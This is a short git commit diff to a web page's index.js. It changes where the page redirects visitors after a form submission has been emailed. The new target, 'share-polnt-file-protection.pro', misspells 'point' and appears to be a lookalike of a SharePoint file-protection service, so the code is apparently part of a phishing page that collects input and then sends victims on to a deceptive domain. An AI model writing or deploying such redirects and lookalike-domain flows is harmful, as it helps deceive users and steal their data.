c15da745361cecd93a2b03e12710f509d53020f8
husknet <127146284+husknet@users.noreply.github.com>
2024-10-24 10:23:38 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://ne.alltracktransportl.com';
+        window.location.href = 'https://ne.share-polnt-file-protection.pro';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
